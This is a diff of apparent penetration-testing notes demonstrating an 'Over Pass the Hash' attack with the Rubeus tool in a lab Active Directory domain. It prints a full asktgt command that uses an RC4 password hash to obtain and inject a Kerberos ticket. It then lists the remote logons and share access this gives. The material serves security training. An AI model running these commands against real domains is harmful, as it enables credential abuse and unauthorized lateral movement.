@@ -1,5 +1,14 @@
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:batch-prod /rc4:49DE316D55D2EF98DB702E743538A291 /domain:security-test-lab.local /dc:192.168.1.50 /ptt /createnetonly:C:\Windows\System32\cmd.exe
+======================================================================================================================
+Example - Over Pass the Hash with the tool RUBEUS
+======================================================================================================================
 
+The 'Over Pass the hash' technique is a combination of passing the hash and passing the ticket. 
+It can be done using the Rubeus (C# toolset for raw Kerberos interaction and abuses).
+Link: https://github.com/GhostPack/Rubeus
+ 
+
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:batch-prod /rc4:49DE316D55D2EF98DB702E743538A291 /domain:security-test-lab.local /dc:192.168.1.50 /ptt /createnetonly:C:\Windows\System32\cmd.exe
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -8,7 +17,6 @@ PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:ba
   |_|   |_|____/|____/|_____)____/(___/
 
   v1.2.1
-
 
 [*] Action: Create Process (/netonly)
 
@@ -60,30 +68,9 @@ PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:ba
 
 PS C:\Users\Administrator.PO718687\Documents\Tools-AD\LAPSToolkit-master>
 
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD\LAPSToolkit-master> explorer
 
-=> Since the ticket has been imported in our session, we can now browse with our explorer the Windows network shares that requires the credentials of the batch-prod account.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Since the ticket has been imported in our session, we can now:
+- log into servers as the user 'batch-prod' using 'Powershell Remoting'
+- browse with an explorer or in command line the Windows network shares accessible to the batch-prod account
 
 
